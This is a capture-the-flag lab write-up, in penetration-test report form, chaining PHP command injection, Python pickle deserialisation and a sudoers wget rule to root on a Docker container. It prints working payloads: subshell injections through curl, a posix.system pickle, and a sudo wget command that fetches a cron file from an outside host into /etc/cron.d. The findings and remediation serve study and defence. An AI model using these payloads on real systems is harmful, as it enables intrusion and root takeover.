# ROLAROLA — DockerLabs lab (id 189, "Medio")

> Lab description from the catalogue (`~/dockerlabs/catalog.txt:27`):
> *"En esta máquina se explota la vulnerabilidad command injection, lo cual permite
> obtener una shell en el sistema como usuario no privilegiado. Posteriormente se
> explota la vulnerabilidad pickle deserialization en python para escalar a root"*.

**Outcome: solved — 3 hops, `uid=100(apache)` → `uid=1000(matsi)` → `uid=0(root)`.
Both advertised classes are really present, and both are filed separately in §3
because they are genuinely distinct bugs with distinct entry criteria. One third
material correction to the description is recorded in §2: the pickle sink does
**not** escalate to root, and I can prove it. No reward artifact exists (§8).**

---

## 1. Surface

### 1.1 TCP scan (verbatim)

```
$ nmap -sV -Pn -p- --open -T4 172.17.0.7
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 04:24 +0000
Nmap scan report for 172.17.0.7
Host is up (0.000048s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.66 ((Unix))
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

The "trípleta", run in order:

| Step | Result |
|---|---|
| **Reachable** | `80/tcp` open, Apache httpd 2.4.66. `GET /` → `HTTP 200`, **478 bytes**. |
| **What the body carries** | A `POST` form with one field `nombre` (`index.php:20-23`), a reflection at `index.php:26`, and a `tail -n 1 names.txt` reflection rendered into a JS argument at `index.php:32-35`. |
| **Decisive** | `index.php:27` — `<?php system("echo $nombre >> names.txt"); ?>` — a request parameter reaching a shell. That is the discriminator, and the source named it before a single request was sent. |

### 1.2 Stack and versions — read from the artefact, not from memory

| Component | Version | Where the fact comes from |
|---|---|---|
| HTTP server | Apache httpd 2.4.66 | `Server:` header, `nmap -sV` |
| PHP (web) | **8.5.1** | `X-Powered-By: PHP/8.5.1`; `/etc/apache2/conf.d/php85-module.conf:1` → `LoadModule php_module modules/mod_php85.so` |
| PHP (CLI) | **8.4.16** | `php -v` → `PHP 8.4.16`; `/usr/bin/php -> php84` |
| OS | Alpine Linux 3.23.2 | `/etc/os-release` |
| Python | 3.12.12 | `python3 -V`; `/usr/bin/python3 -> python3.12` |
| Init | `/bin/sh -c "bash /root/entrypoint.sh && tail -f /dev/null"` | `docker inspect -f '{{.Config.Cmd}}' rolarola:latest` |
| Entrypoint | 3 effective lines | `/root/entrypoint.sh:6-7` → `httpd &` and `crond &` |

**The PHP version is two different numbers and both are correct.** The web SAPI is
`mod_php85.so` (8.5.1) while the only PHP binary in the image is `php84` (8.4.16).
A CVE range recalled from memory would have been a guess against the wrong number;
both numbers are recorded so neither is.

`auto_deploy.sh` does not exist in this image, and I did not run anything resembling
it. `docker inspect` shows a **single** container, no compose file, and **no
`ExposedPorts`** at all — the image declares nothing, so the topology had to be read
out of `/root/entrypoint.sh` and the two crontabs.

### 1.3 Hidden surfaces — what the TCP scan cannot see

`/proc/net/tcp` inside the container, the method the RUNBOOK names for exactly this:

```
  sl  local_address                         rem_address   st tx_queue rx_queue ...
   0: 0100007F:1B39 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000  0 60462884
```

`0100007F:1B39` = **`127.0.0.1:6969`**, state `0A` = `LISTEN`, **uid `1000` = matsi**.
This is the deserialisation sink, and `-p-` cannot see it. Proved as a real negative
rather than an assumption:

```
$ nmap -Pn -p 6969 172.17.0.7
PORT     STATE  SERVICE
6969/tcp closed acmsoda
```

`closed`/`conn-refused`, not `filtered` — the socket is bound to loopback, so the
kernel answers. **Work count: 1 port probed, 1 connect-refused.** The absence from
the scan is a property of the bind address, not evidence of absence of the service.

Port 80 does not appear in `/proc/net/tcp` at all; it is in `/proc/net/tcp6` as
`00000000000000000000000000000000:0050`, an IPv6 wildcard, which is why the
IPv4-mapped entries `...FFFF0000070011AC:0050` show up as established. Two listening
sockets, one of them invisible to `nmap -p-` on the interface it is bound to.

**UDP:** `/proc/net/udp` and `/proc/net/udp6` are both **empty — 0 rows returned.**
That is a measured negative with a work count, not an untested one.

### 1.4 The second, unauthenticated service — and who starts it

Neither `httpd` nor `app.py` is started by the entrypoint in the way a reader would
assume. `ps aux` inside the container:

```
PID   USER     COMMAND
    1 root      tail -f /dev/null
   11 root      httpd
   12 apache    httpd
   18 matsi     python3 /home/matsi/proyect/app.py
   17 root      {crond} CROND
```

`app.py` runs as **matsi** because of **matsi's own crontab**:

```
$ su - matsi -c "crontab -l"
* * * * * python3 /home/matsi/proyect/app.py
```

That is why the service is `uid 1000` in `/proc/net/tcp` and not root, and it is the
single most important fact for reading the escalation: the deserialisation sink runs
at `uid 1000`, so it **cannot** be the thing that reaches root. See §2.

---

## 2. Which of the two declared classes is actually present

**Both. They are two distinct bugs, not one bug and its escalation.** I am filing
them separately (F1, F2) because each has its own entry criterion, and fixing either
one alone leaves the other fully exploitable.

| | Class | Entry criterion — the question that starts it | Source that settled it |
|---|---|---|---|
| **F1** | OS command injection, CWE-78 | Does an unauthenticated request parameter reach a shell? | `index.php:27` |
| **F2** | Unsafe deserialisation, CWE-502 | Does `pickle.loads` run on bytes that came off a socket? | `app.py:43`, fed by `app.py:74` |

F2's entry criterion is **independent of F1 and does not require it**: the service
listens on loopback with **no authentication whatsoever** (`app.py:48-80` — there is
no credential check, no token, no uid check), so *any* local uid that can open a TCP
connection to `127.0.0.1:6969` can plant a pickle and trigger it. In this lab the
only remote way onto the box is F1, so F1 is the remote entry and F2 is the local
one — but the two bugs are not chained to each other, and a report that merged them
would tell the client that patching the PHP form fixed the deserialisation.

### 2.1 What the description got wrong

The description says the pickle deserialisation is what *"escala a root"*. Measured,
it is not:

```
# executed by the deserialising process, from inside the sink:
$ pwd
/home/matsi
$ id
uid=1000(matsi) gid=1000(matsi) groups=1000(matsi)
```

The pickle sink's ceiling is **`matsi`**, and it has been measured three separate
times (§4, hops 1 and 2). The step that actually reaches root is a third, entirely
different bug: the `sudoers` rule at **`/etc/sudoers:123`**

```
matsi ALL=(ALL:ALL) NOPASSWD: /usr/bin/wget
```

with **no argument restriction**, which is a privilege escalation in its own right
(F5). So the real shape of the lab is three bugs, and the lab's own description
mis-attributes the third to the second. The correct statement is: *command injection
gets you `apache`; pickle gets you `matsi`; a sudoers rule gets you `root`.*

### 2.2 Convergence note

`corpus/INDEX.md:35` already carries a pickle row — lab 148, where pickle is a
**gadget in a stack buffer overflow**. Per PIPELINE.md §"Feeding forward", an
existing rule that survives a fresh case is stronger than a new rule with one, and
the honest outcome here is **extend, do not duplicate**: our deserialisation
coverage is not "pickle-only, one instance". Lab 148 exercises pickle as a *gadget
reached through memory corruption in C*; lab 189 exercises `pickle.loads()` directly
on *untrusted network bytes in Python*, which is CWE-502 on its own terms and a
different trust boundary. The gap named in `tooling/labs.manifest:69` is closed by
this row, and it closes by widening an existing class rather than by adding one.

---

## 3. Findings

### F1 — Unauthenticated OS command injection, CWE-78 (Critical)

**Location:** `/var/www/localhost/htdocs/index.php:27`

```php
 4: if ($_SERVER["REQUEST_METHOD"] === "POST") {
 5:     $nombre = htmlspecialchars($_POST["nombre"]);
 6: }
...
25: <?php if ($nombre): ?>
26:     <p class="saludo">Hola <strong><?php echo $nombre; ?></strong>, bienvenido 😎</p>
27:     <?php system("echo $nombre >> names.txt"); ?>
```

**Entry criterion satisfied:** `POST nombre` reaches a shell. No authentication, no
`required` server-side check, no rate limit, no CSRF token.

**Root cause:** a sanitiser for the **wrong context**. `htmlspecialchars()` at
`index.php:5` is an HTML-escaping function applied to a value that is then
interpolated into a **shell command** at line 27. It escapes `& " ' < >` and leaves
`; | $ ( ) \` ` and newline untouched. Context confusion, not a missing filter.

**Positive control — the payload reached the sink, with an observable effect.**
A `200` rendering a page proves nothing, so the control is built to be
*discriminating*: the same request is rendered in two places, and the two must
disagree if the **shell** (not PHP) evaluated the payload.

```
$ curl -s -X POST --data-urlencode 'nombre=A189-$(id)' http://172.17.0.7/ | grep -n 'Hola\|button('
18:    <p class="saludo">Hola <strong>A189-$(id)</strong>, bienvenido 😎</p>
22:<button onclick='button("A189-uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)")'>
```

Line 18 shows the **literal, unevaluated** string — that is PHP echoing the variable.
Line 22 shows the **real `id` output** — that is `/bin/sh` running the subshell, read
back out of `names.txt` by `index.php:32`. Same request, two renders, one of them
transformed by a shell. There is no way to produce that pair without the sink firing.

Independent second oracle, read off the filesystem:

```
$ ls -l /var/www/localhost/htdocs/names.txt
-rw-r--r-- 1 apache apache 93 ... names.txt
$ cat -A names.txt
BASELINE189$
A189-uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)$
```

**Identity at this hop, measured:** `uid=100(apache) gid=101(apache)`. Not assumed
from the Apache config — printed by the payload, twice, plus a third time in §4.

**Impact:** unauthenticated remote code execution as `apache`, with the command's
**stdout retrievable over plain HTTP** (see F3). From `apache` the loopback pickle
service is one `connect()` away, which is how F2 is reached in this lab.

**Remediation:** do not build a shell command out of request data. If a shell is
unavoidable, pass the value as an argument (`system('printf %s ', $argv)`) or use
`escapeshellarg()`. The HTML context needs `htmlspecialchars()` and the shell context
needs `escapeshellarg()`; using one for the other is the bug. A denylist over shell
metacharacters is not a fix — F1's own sink proves the character set is not the
boundary.

### F2 — Unsafe deserialisation of untrusted data, CWE-502 (Critical)

**Location:** `/home/matsi/proyect/app.py:43`, fed by `app.py:74`

```python
22: def guardar_objetivo(blob):
23:     with open(DATA_FILE, "ab") as f:
24:         size = len(blob).to_bytes(4, "big")
25:         f.write(size + blob)   # guarda RAW, no pickle
26:
28: def leer_objetivos():
...
34:     with open(DATA_FILE, "rb") as f:
35:         while True:
36:             size_bytes = f.read(4)
37:             if not size_bytes:
38:                 break
39:             size = int.from_bytes(size_bytes, "big")
40:             data = f.read(size)
43:             objetivos.append(pickle.loads(data))    # <-- SINK
...
73:             send(conn, "Objetivo: ")
74:             blob = recv_bytes(conn)                 # <-- ATTACKER BYTES
75:
76:             guardar_objetivo(blob)
```

**Entry criterion satisfied:** the sink is `pickle.loads()` on bytes that arrived
from a socket. The author even documented the design in the comment at line 25 —
`guarda RAW, no pickle` — and then fed the raw bytes straight back into a pickle
loader. The comment is about the *storage format*, and the storage format is
irrelevant: the deserialisation happens on the way back out, on data that never had
to be a valid pickle in the first place.

**Entry criterion is independent of F1:** `app.py:48-80` implements a two-option menu
with **no authentication of any kind**. Any local uid can connect, choose `2`, write
a name, an age and a raw blob, then choose `1` to trigger it.

**Positive control — the payload reached the sink and executed.** The wire protocol
is length-prefixed raw bytes, and the stored file proves the frames landed:

```
$ python3 -c "walk the 4-byte BE length prefixes in /home/matsi/objetivos.bin"
frame 1: len=211 first16=b'cposix\nsystem\np0'
frame 2: len=302 first16=b'cposix\nsystem\np0'
frame 3: len=455 first16=b'cposix\nsystem\np0'
frame 4: len=433 first16=b'cposix\nsystem\np0'
frame 5: len=559 first16=b'cposix\nsystem\np0'
frames: 5 bytes consumed: 1980 of 1980
```

`5` frames, `1980 of 1980` bytes consumed — the walk terminates exactly on the file
length, so the format is confirmed rather than assumed. Every frame begins with
`cposix\nsystem\np0`, the `GLOBAL`/`STACK_GLOBAL` preamble for the `posix.system`
reducer. Frame 1 in full:

```
cposix
system
p0
(Vid > /home/matsi/pickle189.proof ; whoami >> /home/matsi/pickle189.proof ;
 echo 6f14fac1551a67a9f9aeeff1 >> /home/matsi/pickle189.proof ; sudo -n -l >> /home/matsi/pickle189.proof
p1
tp2
Rp3
.
```

**The vector's oracle is the `- N` in the option-1 reply, and it is weak, so I did
not rely on it.** `app.py:63` sends `f"- {o}\n"` where `o` is the return value of
`os.system`, i.e. an **exit code**:

```
WRITE_REPLY: [+] Objetivo guardado
READ_REPLY: --- OBJETIVOS --- | - 0
```

`- 0` is "the command chain exited 0". That is a real observation but it is *not*
proof of *which* uid ran it or *what* it did — an exit code is forgeable by any
payload. So I manufactured the oracle the RUNBOOK asks for.

**Manufactured oracle — a path only the target identity can create.** The marker
file goes to `/home/matsi/`, which is `drwxr-s--- matsi matsi`. Before exploiting, I
proved hop 1's identity **cannot** write there, with a green positive control on both
detectors:

```
### run as uid=100(apache) through F1:
matsi_writable=1      <- test -w /home/matsi  : NOT writable
tmp_writable=0        <- test -w /tmp          : writable  (detector works)
matsi_touch_rc=1      <- touch /home/matsi/apache_cannot.proof : failed
tmp_touch_rc=0        <- touch /tmp/apache_can189.proof       : succeeded (detector works)
```

Filesystem confirmation: `/home/matsi/apache_cannot.proof` **absent**,
`/tmp/apache_can189.proof` present, `-rw-r--r-- 1 apache apache 0`. The path is
identity-restricted, and hop 1 is excluded from creating it.

Then the pickle executed, and the marker appeared:

```
$ ls -l /home/matsi/pickle189.proof
-rw-r--r-- 1 matsi matsi 437 ... /home/matsi/pickle189.proof
$ cat -A /home/matsi/pickle189.proof
uid=1000(matsi) gid=1000(matsi) groups=1000(matsi)$
matsi$
6f14fac1551a67a9f9aeeff1$
Matching Defaults entries for matsi on 53087e4a6eba:$
...
User matsi may run the following commands on 53087e4a6eba:$
    (ALL : ALL) NOPASSWD: /usr/bin/wget$
```

Four independent facts in one artefact: **owner `matsi(1000)`**, `id` reporting
`uid=1000`, `whoami` reporting `matsi`, and a **12-byte random token**
`6f14fac1551a67a9f9aeeff1` generated on the host before the run, which is what makes
the file distinguishable from anything pre-existing. The deserialisation ran as
**`matsi`**, which is the identity of the *app process*, not of whoever sent the bytes
— the sender was `apache`, and the file's owner proves the receiving end, not the
sending one.

**Impact:** arbitrary command execution as `matsi` for any local uid that can reach
the loopback port. Combined with F5 this is a full path to root, but the two must be
patched separately.

**Remediation:** never `pickle.loads()` on data you did not create. Use `json`, or a
schema-validated format. If pickle is unavoidable, `hmac`-sign the blob and verify
before loading — a signature check *before* `pickle.loads` is the whole control.
Independently: the service needs authentication, and it should not accept raw bytes
from a socket at all. Note the 4096-byte single-`recv` at `app.py:19` also truncates
silently, which is a correctness bug independent of the security one.

### F3 — Command output written to a web-served file, CWE-532 (High)

**Consequence of F1 with an independent impact, so it is filed separately.**

`index.php:27` appends the command's **stdout** to `names.txt`, and `names.txt` lives
**inside the document root** at `/var/www/localhost/htdocs/names.txt`, served by
`DirectoryIndex`-adjacent static handling with no access control:

```
$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://172.17.0.7/names.txt
GET /names.txt -> HTTP 200, 3084 bytes
```

**Work count: 1 request, 1 file, 3084 bytes of accumulated command output returned
unauthenticated.** The injection is therefore not blind: an attacker who cannot
maintain a channel to the target can still **exfiltrate through the browser-facing
origin**, and every other user's submissions are readable too. `names.txt` also
grows without bound, since every POST appends a line and nothing truncates it.

**Remediation:** never write command output into the document root. Use a path
outside it with restrictive permissions, or return results in the response body only
to the requester.

### F4 — Source disclosure via a world-readable leftover `.git`, CWE-527 / CWE-732 (Medium)

**Location:** `/opt/.git` — a complete git repository, root-owned, with an **empty
working tree**, that the image ships. `/opt` is `drwxr-xr-x root root` and
`/opt/.git` is `drwxr-sr-x root root`, so **every uid on the box can traverse and
read it**, while the project's own directory is correctly private:

```
$ stat -c '%n %A %U' /opt /opt/.git /home/matsi /home/matsi/proyect
/opt                drwxr-xr-x root
/opt/.git           drwxr-sr-x root
/home/matsi         drwxr-s--- matsi
/home/matsi/proyect drwxr-x--- matsi
```

`git -C /opt ls-tree -r HEAD` → `app.py`, `objetivos.bin`, commit `119ed67
Mi primer commit?` — the same commit as `/home/matsi/proyect`. The disclosure is
real, and it is specifically the disclosure of **the deserialisation sink**:

```
$ su -s /bin/sh apache -c "git -c safe.directory=/opt -C /opt show HEAD:app.py | sed -n '40,45p'"
            size = int.from_bytes(size_bytes, "big")
            data = f.read(size)

            objetivos.append(pickle.loads(data))
git_rc=0

$ su -s /bin/sh apache -c "cat /home/matsi/proyect/app.py"
apache_read_rc=1
cat: can't open '/home/matsi/proyect/app.py': Permission denied
```

Two-sided and decisive: the *same file* is readable by `apache` via `/opt/.git`
(`git_rc=0`, sink source returned) and **not** readable at its intended location
(`apache_read_rc=1`, `Permission denied`). The `0750` on the project directory is
completely defeated by the copy left in `/opt`. An attacker who has any low-privilege
 foothold on this host — including the `apache` shell that F1 hands out for free —
reads the exact line number of the pickle sink and the exact wire protocol needed to
drive it, with no reverse engineering.

**Remediation:** delete `/opt/.git` from the image (or `/opt` entirely — it has no
other content). Build artefacts, VCS metadata and empty staging directories have no
business in a shipped image.

### F5 — `sudoers` grants a root shell to a downloader, CWE-250 / CWE-269 (Critical)

**Location:** `/etc/sudoers:123`

```
122: root ALL=(ALL:ALL) ALL
123: matsi ALL=(ALL:ALL) NOPASSWD: /usr/bin/wget
```

`sudoers` command entries without an argument list permit **any arguments**. `wget`
can write anywhere, so this is not "matsi may download a file", it is "matsi may ask
root to create or overwrite any file on the system":

```
$ sudo -n /usr/bin/wget -q -O /etc/cron.d/p189 http://172.17.0.1:9099/p189.cron
escalate_rc=0
$ ls -l /etc/cron.d/p189
-rw-r--r-- 1 root root 94 ... /etc/cron.d/p189
```

`/etc/cron.d` is `drwxr-xr-x root root` and I had already measured
`crond_writable=1` from `matsi` — matsi cannot write there. The planted file is owned
by **root**, which is the discriminator: a file created through `sudo wget` is
root-owned, while the same `wget` without `sudo` produced
`/tmp/sudow189.txt` owned by `matsi`.

**This is the lab's actual root step, and the lab's description attributes it to the
pickle bug (§2.1).** Patching the deserialisation does not remove this.

**Remediation:** remove the rule. If `matsi` genuinely needs to fetch a file, allow a
specific wrapper with a fixed destination, and never grant a general-purpose
downloader `NOPASSWD` root.

---

## 4. The chain

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 1 | `uid=100(apache)` | **F1** — `POST nombre` → `index.php:27` `system("echo $nombre >> names.txt")`. `htmlspecialchars` does not touch `$( )`. | `uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)` — rendered into the page at `index.php:35`, and independently in `names.txt` on disk. Measured 3× (§1.3 tool sweep, §3 F1, §4 hop-1 pre-flight). |
| 2 | `uid=1000(matsi)` | **F2** — from the `apache` shell, `connect()` to `127.0.0.1:6969` (loopback, uid 1000, no auth), write a `posix.system` pickle via menu option `2`, then trigger `pickle.loads` via option `1`. | `/home/matsi/pickle189.proof` owner **`matsi(1000)`**, `drwxr-s---` parent, contents `uid=1000(matsi)` / `matsi` / token `6f14fac1551a67a9f9aeeff1`. Negative control first: hop 1 is provably unable to create that path (`matsi_touch_rc=1`, file absent). |
| 3 | `uid=0(root)` | **F5** + cron — as `matsi`, write a crontab line to `/tmp`, then `sudo -n /usr/bin/wget -O /etc/cron.d/p189 http://<engagement-host>:9099/p189.cron`. `crond` (started by `entrypoint.sh:7` as root) executes it. | `/root/root189.proof`, **owner `root`**, inside `/root` which is `drwx------` and measured `root_writable=1` from `matsi`: `uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),…` + token `6f14fac1551a67a9f9aeeff1`. |

**Hop 3's oracle was manufactured before the exploit, not reported afterwards.** The
escalation vector here has no inherent output — crond runs silently — so the claim
"this cron runs my script as root" would have been a statement about the future. What
I did instead: pre-state measured (`ls -l /root/root189.proof` → `Permission denied`
from `matsi`, and `root_writable=1`), then a cron line whose only job is to write a
**root-owned file into a 0700 root-only path carrying a token generated before the
run**, then a poll for its appearance. It appeared within ~10 s:

```
-rw-r--r-- 1 root root 163 ... /root/root189.proof
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)$
6f14fac1551a67a9f9aeeff1$
```

An escalation that had not worked would have been filed separately; this one worked,
and the file above is the result, not the prediction.

**Also established while in the sink, because the RUNBOOK asks for the execution
identity at every hop — including the CWD, which `DATA_FILE` at `app.py:7` leaves
relative:**

```
$ pwd ; $ id ; $ env | sort
/home/matsi
uid=1000(matsi) gid=1000(matsi) groups=1000(matsi)
HOME=/home/matsi
LOGNAME=matsi
PATH=/bin:/usr/bin:/sbin:/dev/null
PWD=/home/matsi
SHELL=/bin/sh
SHLVL=2
USER=matsi
```

`PWD=/home/matsi` is the direct proof that the relative `objetivos.bin` at
`app.py:7` resolves inside `matsi`'s home — which is why `apache` never needed any
filesystem access to plant a frame. It only needed to write bytes to a socket; the
**app process**, running as `matsi`, did the writing. I initially mis-attributed that
write to `apache` and corrected it: `/home/matsi` is `0750`, so `apache` provably
cannot create anything in it, and the file is `matsi`-owned.

---

## 5. Controls that held

Each with the positive control that proves the detector can fire. A control that has
never seen a success is not a control.

| Control | Positive control that proves this detector works | Evidence |
|---|---|---|
| **`sudo` is not blanket.** Only `wget` is passwordless. | `sudo -n -l` **succeeds without a password** and prints the allowed set, so the mechanism is demonstrably live; then two non-matching commands are refused. | `sudo -n /bin/sh -c id` → `sudo_sh_rc=1`, `sudo -n /usr/bin/id` → `sudo_id_rc=1`, stderr `sudo: a password is required` (×2). Policy is narrow and it held. |
| **CGI execution is disabled.** `printenv`, `test-cgi`, `printenv.vbs`, `printenv.wsf` sit in `cgi-bin` but do not execute. | `ScriptAlias /cgi-bin/` **is** registered (`httpd.conf:362`), so the location is live and reachable — the control being tested is `Options`/`AddHandler`, not the alias. | `httpd.conf:380` `Options None`; `httpd.conf:426` `#AddHandler cgi-script .cgi` (commented). All four paths → `HTTP 200` serving the script **as plain text**, first 60 bytes `## To permit this cgi, replace # on the first line above w`. 4 requests, 4 × ~1 KB. These are unmodified Apache defaults, so the source exposure is stock and is **not** filed as a finding. |
| **The pickle service is not externally reachable.** | A `6969/tcp` probe from outside returns `closed` (conn-refused, not `filtered`) — the bind address is loopback. | `nmap -Pn -p 6969 172.17.0.7` → `6969/tcp closed acmsoda`. 1 port, 1 refusal. |
| **No UDP surface.** | `/proc/net/udp` and `/proc/net/udp6` both return **0 rows** — a measured empty, not an unrun scan. | Empty file contents, 0 rows each. |
| **The `matsi` home is not writable by other uids.** | Paired detectors both fire in both directions: `test -w` returns 1 for `/home/matsi` and 0 for `/tmp`; `touch` returns 1 and 0 respectively; the files confirm it. | `matsi_writable=1 tmp_writable=0 matsi_touch_rc=1 tmp_touch_rc=0`, 2 paths tested per detector. This is what licensed the hop-2 and hop-3 oracles. |
| **The project directory is private.** | Same read attempted at the intended path and at the leftover one — opposite results, same file. | `apache_read_rc=1` (`Permission denied`) at `/home/matsi/proyect/app.py` vs `git_rc=0` via `/opt/.git`. The control held at its own path and was **bypassed elsewhere** — that contrast is F4, not a control. |

**A control that did not hold, recorded separately because it looked like one:** the
shell injection *appears* to be defeated by `htmlspecialchars` — the page renders
`&lt;` `&gt;` `&#039;` `&quot;` `&amp;` correctly, which reads exactly like a filter
working. It is not a filter in this context. §6.1 has the measurement.

---

## 6. Instrumentation defects

Four, and the first one would have deleted a finding.

### 6.1 `htmlspecialchars` turns `&` into a shell control operator — a filter-shaped negative that was not a filter

`htmlspecialchars()` escapes `&` to `&amp;`. The sink is a **shell**, where `&` is the
background operator. So the sanitiser does not block the injection — it silently
**restructures the attacker's command**, and the visible effect is a file that does
not grow.

The first sign was a request that returned a fully rendered page and appended
**nothing**: `names.txt` stayed at 2 lines / 93 bytes with an unchanged mtime. The
naive conclusion is "the filter blocked me", which would have closed F1 as a
non-finding. Three legs, designed so the mechanism is the only explanation:

**A — control, no `&`, must reach the file:**

```
$ curl -X POST --data-urlencode 'nombre=A189b-$(echo FOREMARK189)' ...
22:<button onclick='button("A189b-FOREMARK189")'>
names.txt: 3 lines, 111 bytes   (grew)
```

**B — same subshell plus one literal `&` (becomes `&amp;`):**

```
$ curl -X POST --data-urlencode 'nombre=A189c-$(sleep 4; echo BGMARK189)&' ...
elapsed=4.10 s
22:<button onclick='button("A189b-FOREMARK189")'>      <- stale, unchanged
names.txt: 3 lines, 111 bytes                          <- grew by 0
```

**C — the backgrounded child must have run, and as whom:**

```
$ curl -X POST --data-urlencode 'nombre=A189g-&$(id | tee /tmp/bg189.txt)' ...
$ ls -l /tmp/bg189.txt
-rw-r--r-- 1 apache apache 76 ... /tmp/bg189.txt
$ cat /tmp/bg189.txt
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)$
```

A and B differ by one character. A grows the file; B grows it by **0 bytes** while
**still spending 4.10 s** — the `sleep` ran, and the request blocked on it. C then
proves the command *did* execute as `apache` and wrote a file readable from outside,
while the sink's own file stayed untouched.

**Mechanism, in full:** `&amp;` reaches `/bin/sh`, which tokenises `&` as a
background operator and splits the command in two. The redirect `>> names.txt`,
which belongs to the *sink's* command line, is then attached to the trailing
`amp;` word-command, which produces no output — so **0 bytes** are appended. The
backgrounded child inherits PHP's `system()` stdout **pipe**, and PHP blocks on that
pipe until EOF, which is why the request still takes the child's full 4 s. The 4.10 s
is the tell; the missing line is not.

**Generalisable rule, and the reason this is worth a section:** *a sanitiser that
rewrites its input can change the parse of the language it did not validate.* Any
negative whose evidence is "the expected output did not appear" must be re-run with a
positive control on the same detector before it is allowed to become a finding of
absence. Here the positive control (A) and the negative (B) differ by one character,
which is exactly the situation where a "blocked" reading is most tempting and least
supported.

**Practical consequence I hit twice:** because `>` and `&` are both escaped, the
usual shell idioms `2>&1` and `cmd > file` are **unavailable inside the injection**.
I lost one cycle to a payload containing `2>&1`, and one to a `;`-list whose trailing
redirect bound only to the last simple command. Both are the same defect seen from
the other side. Workarounds that need no `>`: `tee` for files, `$( )` for capture, and
`$?` for the exit status instead of stderr text.

### 6.2 `git`'s `safe.directory` refusal exits 0 and produces empty stdout

The same command, two identities, opposite answers:

```
# as root (owns /opt/.git, so no gate):
$ git -C /opt cat-file -s HEAD:objetivos.bin
29
$ git -C /opt cat-file -p HEAD:objetivos.bin | od -c
0000000  \0  \0  \0 031   T   e   r   m   i   n   a   r ...   g   i   t  \n

# as apache:
$ su -s /bin/sh apache -c "git -C /opt cat-file -p HEAD:objetivos.bin | od -c"
fatal: detected dubious ownership in repository at '/opt'      <- STDERR
0000000                                                          <- 0 bytes on STDOUT
apache_pipeline_rc=0                                             <- exit 0
```

The blob is **29 bytes**, not empty. Had I run the first version of this check as
`apache` and read the `od -c` line, I would have reported the committed artefact as
empty — a **work count of 0** presented as a result. This is the same shape as the
catalogued `find -writable` defect: a refusal that reports itself as an ordinary empty
result, **and exits 0**. The `| od -c` pipeline hides it further, because the exit
status the shell reports is `od`'s, not `git`'s.

**Rule:** a pipe is not an error channel. `2>&1` before concluding anything, and
compare the byte count against a run as an identity that is not gated.

### 6.3 busybox `wget` has no `file://` scheme

```
$ wget -q -O /tmp/wtest189.txt file:///etc/hostname
file_rc=1
$ wc -c /tmp/wtest189.txt
0 /tmp/wtest189.txt
```

Zero bytes fetched, `rc=1`. Had I not checked the byte count I would have read
`rc=1` as "the file is unreadable" and gone looking for a permissions bug. The scheme
simply does not exist in this build (`Usage: base64 [-d] [-w COL] [FILE]` style
busybox applet help confirms the reduced feature set). The escalation therefore had
to fetch over **HTTP** from the engagement host — which is also why F5's evidence
includes a successful `wget` of a real 94-byte document from `172.17.0.1`.

### 6.4 Tooling absent in the measurement environment, and one blocked read

| Attempt | What happened | How it was caught |
|---|---|---|
| `curl` inside the container to probe `/cgi-bin/*` | `bash: line 3: curl: command not found` — **0 requests, 0 bytes, no status code** | The output was a blank HTTP field and `0 bytes`, i.e. a **zero work count**. Re-run from the host against `172.17.0.7`: 4 requests, 4 × ~1 KB, real status codes. A blank result is not a negative. |
| `readlink /proc/18/cwd`, `tr </proc/18/environ` | `Permission denied` even as container root | Not chased. The value was obtained **from inside the sink instead** — the pickle RCE runs `pwd` in the app's own context, which is a better measurement than reading `/proc` would have been. |
| `rtk` used inside `docker exec` | `bash: line 1: rtk: command not found` | `rtk` is a host-side shim; the first two `ls` calls silently returned nothing and I only noticed because the output was empty where a file listing was expected. Every container-side command was re-run without it. |

---

## 7. NOT tested, vs discarded with reason

### 7.1 NOT tested (no conclusion claimed)

- **UDP services beyond the empty `/proc/net/udp{,6}`.** The tables returned 0 rows,
  which is a strong negative, but I did not attempt a UDP sweep — so "no UDP service
  exists" is a statement about the kernel's view, not about packets in flight.
- **Exploitation of the `printenv` / `test-cgi` scripts as CGI.** Confirmed not
  executed (§5). I did not try to enable CGI or find another handler, and I make no
  claim about what they would do if enabled.
- **`app.py` menu branches other than `1` and `2`,** and the `"Opción inválida"` arm
  at `app.py:79-80`.
- **The 4096-byte boundary of `recv_bytes` (`app.py:19`).** My largest frame was
  559 bytes. Whether a frame larger than 4096 bytes is silently truncated — and
  therefore whether a length prefix and its payload can desynchronise — is untested.
  I flag it as a likely second-order bug in F2, not as a result.
- **The `run-parts` jobs in root's crontab** (`/etc/crontab`, `*/15`, hourly, daily,
  weekly, monthly). Not read, not tested, no claim.
- **`/opt`'s purpose.** `/opt` contains only `.git` and no working tree. I did not
  investigate the build history; F4 reports the disclosure, not a motive.
- **Any second host.** `auto_deploy.sh` does not exist in this image and
  `ExposedPorts` is empty, so I found no evidence of a multi-container topology. If
  one exists behind this image, I did not see it.

### 7.2 Discarded, with reason

- **Chaining `F1` straight to root.** `apache` has no sudo rule, no SUID binary
  (`find / -xdev \( -perm -4000 -o -perm -2000 \)` → `/usr/bin/crontab`, `/usr/bin/sudo`,
  `/usr/sbin/suexec`, `/bin/bbsuid` only, all standard setuid or setgid with no
  escalation path) and no file capabilities (`getcap -r /` → empty). Discarded as
  impossible, not merely unattempted.
- **Getting root out of the pickle sink alone.** F2's ceiling is `matsi`, measured
  three times. The lab description says otherwise (§2.1); I followed the measurement.
  This is a **discarded hypothesis with a reason**, and the reason is a positive
  result about F5.
- **A pre-seeded malicious pickle in the image.** The `objetivos.bin` committed in
  `/opt/.git` looked like a candidate payload. It is not: it is 29 bytes of
  `00000019` + `Terminar mi proyecto git.\n` — an author's note, and not even a valid
  pickle, so feeding it to `app.py:43` would raise. Discarded after reading its bytes.
